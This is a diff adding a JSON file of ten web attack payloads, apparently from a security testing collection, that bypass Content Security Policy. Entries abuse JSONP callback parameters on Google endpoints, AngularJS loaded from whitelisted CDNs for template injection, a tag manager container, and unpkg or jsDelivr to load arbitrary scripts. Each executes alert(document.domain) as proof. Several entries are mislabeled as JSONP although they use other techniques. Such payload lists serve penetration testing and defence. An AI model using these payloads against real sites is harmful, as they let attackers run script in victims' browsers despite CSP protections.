@@ -1,0 +1,98 @@
+{
+  "category": "csp_bypass",
+  "subcategory": "jsonp_callback",
+  "description": "Payloads exploiting whitelisted JSONP endpoints to execute arbitrary JS despite CSP",
+  "count": 10,
+  "payloads": [
+    {
+      "id": "csp-jsonp-001",
+      "category": "csp_bypass",
+      "subcategory": "jsonp_callback",
+      "payload": "<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)'></script>",
+      "description": "Google OAuth JSONP — classic CSP bypass via callback param",
+      "technique": "jsonp_callback",
+      "csp_bypass": "Whitelisted *.google.com with JSONP callback injection"
+    },
+    {
+      "id": "csp-jsonp-002",
+      "category": "csp_bypass",
+      "subcategory": "jsonp_callback",
+      "payload": "<script src='https://maps.googleapis.com/maps/api/js?callback=alert'></script>",
+      "description": "Google Maps API callback — calls alert() as initialization",
+      "technique": "jsonp_callback",
+      "csp_bypass": "Whitelisted *.googleapis.com with callback parameter"
+    },
+    {
+      "id": "csp-jsonp-003",
+      "category": "csp_bypass",
+      "subcategory": "jsonp_callback",
+      "payload": "<script src='https://translate.googleapis.com/translate_a/l?client=dict-chrome-ex&sl=en&tl=es&cb=alert'></script>",
+      "description": "Google Translate JSONP — cb parameter executes callback",
+      "technique": "jsonp_callback",
+      "csp_bypass": "Whitelisted translate.googleapis.com JSONP endpoint"
+    },
+    {
+      "id": "csp-jsonp-004",
+      "category": "csp_bypass",
+      "subcategory": "jsonp_callback",
+      "payload": "<script src='https://cdn.jsdelivr.net/npm/angular@1.6.0/angular.min.js'></script><div ng-app ng-csp><div ng-click=$event.view.alert(document.domain)>click</div></div>",
+      "description": "AngularJS via jsDelivr — CSP bypass through Angular template injection",
+      "technique": "jsonp_callback",
+      "csp_bypass": "CDN whitelist loads AngularJS which enables template-based XSS"
+    },
+    {
+      "id": "csp-jsonp-005",
+      "category": "csp_bypass",
+      "subcategory": "jsonp_callback",
+      "payload": "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js'></script><div ng-app ng-csp>{{$eval.constructor('alert(document.domain)')()}}</div>",
+      "description": "AngularJS via cdnjs — template expression eval bypass",
+      "technique": "jsonp_callback",
+      "csp_bypass": "Cloudflare CDN whitelist loads Angular for template injection"
+    },
+    {
+      "id": "csp-jsonp-006",
+      "category": "csp_bypass",
+      "subcategory": "jsonp_callback",
+      "payload": "<script src='https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js'></script><div ng-app ng-csp>{{$eval.constructor('alert(document.domain)')()}}</div>",
+      "description": "AngularJS via Google CDN — most common CSP bypass pattern",
+      "technique": "jsonp_callback",
+      "csp_bypass": "Google CDN whitelist + AngularJS template injection"
+    },
+    {
+      "id": "csp-jsonp-007",
+      "category": "csp_bypass",
+      "subcategory": "jsonp_callback",
+      "payload": "<script src='https://www.googletagmanager.com/gtm.js?id=GTM-XXXXXX'></script>",
+      "description": "GTM container injection — loads arbitrary JS via tag manager",
+      "technique": "jsonp_callback",
+      "csp_bypass": "GTM whitelist allows loading attacker-controlled container"
+    },
+    {
+      "id": "csp-jsonp-008",
+      "category": "csp_bypass",
+      "subcategory": "jsonp_callback",
+      "payload": "<script src='https://www.google.com/complete/search?client=chrome&q=test&callback=alert'></script>",
+      "description": "Google Search autocomplete JSONP — callback execution",
+      "technique": "jsonp_callback",
+      "csp_bypass": "Google Search JSONP endpoint with callback parameter"
+    },
+    {
+      "id": "csp-jsonp-009",
+      "category": "csp_bypass",
+      "subcategory": "jsonp_callback",
+      "payload": "<script src='https://unpkg.com/react@16/umd/react.production.min.js'></script>",
+      "description": "unpkg CDN — loads any npm package as script",
+      "technique": "jsonp_callback",
+      "csp_bypass": "unpkg whitelist allows loading arbitrary npm packages"
+    },
+    {
+      "id": "csp-jsonp-010",
+      "category": "csp_bypass",
+      "subcategory": "jsonp_callback",
+      "payload": "<script src='https://cdn.jsdelivr.net/gh/nicolo-ribaudo/tc39-proposal/polyfill.min.js'></script>",
+      "description": "jsDelivr GitHub proxy — loads arbitrary GitHub repo files as JS",
+      "technique": "jsonp_callback",
+      "csp_bypass": "jsDelivr serves any GitHub repo file as script"
+    }
+  ]
+}
